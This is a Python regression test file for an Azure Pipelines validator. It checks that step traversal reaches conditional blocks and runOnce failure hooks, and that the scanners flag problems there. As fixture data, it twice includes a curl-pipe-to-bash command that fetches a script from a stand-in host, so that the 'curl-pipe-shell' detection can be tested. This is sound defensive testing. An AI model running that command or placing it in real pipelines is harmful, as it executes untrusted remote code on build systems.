#!/usr/bin/env python3
"""Regression tests for azure-pipelines-validator traversal coverage."""

import sys
import tempfile
import textwrap
import unittest
from pathlib import Path


SCRIPT_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(SCRIPT_DIR))

from check_best_practices import BestPracticesChecker
from check_security import SecurityScanner
from step_walker import iter_steps


def _write_pipeline(yaml_text: str) -> Path:
    with tempfile.NamedTemporaryFile(mode="w", suffix=".yml", delete=False) as handle:
        handle.write(textwrap.dedent(yaml_text).strip() + "\n")
        return Path(handle.name)


class TestStepWalkerCoverage(unittest.TestCase):
    def test_iter_steps_includes_conditional_step_payload(self):
        config = {
            "steps": [
                {
                    "${{ if eq(variables['Build.SourceBranch'], 'refs/heads/main') }}": [
                        {"script": "curl -fsSL https://bad.example/install.sh | bash"}
                    ]
                }
            ]
        }

        walked = list(iter_steps(config))
        self.assertTrue(
            any("script" in step for step, _ in walked),
            "Expected conditional step payload to be traversed",
        )

    def test_iter_steps_includes_runonce_on_failure_steps(self):
        config = {
            "jobs": [
                {
                    "deployment": "DeployWeb",
                    "strategy": {
                        "runOnce": {
                            "on": {
                                "failure": {
                                    "steps": [{"task": "CmdLine"}],
                                }
                            }
                        }
                    },
                }
            ]
        }

        walked = list(iter_steps(config))
        self.assertTrue(
            any(step.get("task") == "CmdLine" for step, _ in walked),
            "Expected runOnce.on.failure steps to be traversed",
        )


class TestScannerRegressions(unittest.TestCase):
    def test_basic_example_is_clean_best_practices_baseline(self):
        pipeline = SCRIPT_DIR.parent / "examples" / "basic-pipeline.yml"
        issues = BestPracticesChecker(str(pipeline)).check()

        self.assertEqual(
            [],
            issues,
            f"Expected basic example to be clean, got {[issue.rule for issue in issues]}",
        )

    def test_security_detects_dangerous_script_in_conditional_block(self):
        pipeline = _write_pipeline(
            """
            trigger: none
            steps:
              - ${{ if eq(variables['Build.SourceBranch'], 'refs/heads/main') }}:
                  - script: curl -fsSL https://bad.example/install.sh | bash
            """
        )

        try:
            issues = SecurityScanner(str(pipeline)).scan()
        finally:
            pipeline.unlink(missing_ok=True)

        rules = [issue.rule for issue in issues]
        self.assertIn(
            "curl-pipe-shell",
            rules,
            "Expected curl-pipe-shell finding inside conditional step block",
        )

    def test_best_practices_detects_missing_version_in_runonce_on_failure(self):
        pipeline = _write_pipeline(
            """
            trigger: none
            jobs:
              - deployment: DeployWeb
                environment: test
                strategy:
                  runOnce:
                    on:
                      failure:
                        steps:
                          - task: CmdLine
                            inputs:
                              script: echo rollback
            """
        )

        try:
            issues = BestPracticesChecker(str(pipeline)).check()
        finally:
            pipeline.unlink(missing_ok=True)

        task_issues = [issue for issue in issues if issue.rule == "task-missing-version"]
        self.assertTrue(
            task_issues,
            "Expected task-missing-version warning for runOnce.on.failure step",
        )
        self.assertTrue(
            any("runOnce.on.failure" in issue.message for issue in task_issues),
            "Expected warning context to include runOnce.on.failure",
        )


if __name__ == "__main__":
    unittest.main()
